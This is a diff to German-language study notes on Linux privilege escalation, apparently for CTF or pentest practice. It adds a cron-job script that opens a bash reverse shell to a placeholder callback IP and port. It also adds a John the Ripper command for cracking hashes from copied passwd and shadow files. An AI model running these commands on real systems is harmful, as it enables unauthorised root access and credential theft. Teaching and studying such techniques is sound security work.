@@ -185,7 +185,11 @@ LFILE=*Datei die Gelesen werden soll* bsp /etc/passwd
 base64 "$LFILE" | base64 --decode
 ```
 
-Das kann man dann nutzen um z.B. die Passwd und Shadow datei auszulesen und zuu kopieren. Diese Kopien kann man dann zusammenfügen via `unshadow passwd.txt shadow.txt > passwords.txt` und dann in John the Ripper weiterverarbeiten und Knacken via `john /usr/share/wordlists/rockyou.txt password.txt `
+Das kann man dann nutzen um z.B. die Passwd und Shadow datei auszulesen und zuu kopieren. Diese Kopien kann man dann zusammenfügen via `unshadow passwd.txt shadow.txt > passwords.txt` und dann in John the Ripper weiterverarbeiten und Knacken via 
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
+```
 
 # Privilegien Eskalieren: Capabilities
 
@@ -215,3 +219,12 @@ Jeder Benutzer auf dem System hat seine eigene crontab-Datei und kann bestimmte 
 Wiegesagt jeder User hat zugriff auf die Cron-Jobs unter `/etc/crontab`
 
 Hier kann es auch vorkommen das ein Cronjob existiert aber das Script gelöscht wurde das der job ausführen soll. Das kann man dann natürliuch nutzen um ein eigenes Script mit passenden namen an der Passenden stelle einzufügen. Egal ob man jetzt das Scripüt anpasst oder ein neues hinerlegt kann man sich hier nach Herzenswunsch austoben um z.B. Automatisch eine Reverseshell mit Root rechten zu starten
+
+Das geht zum beispiel indem man das Script verwendet 
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/*CallbackIP*/*callbackPort* 0>&1
+```
+
+# Privilegien Eskalierung: PATH
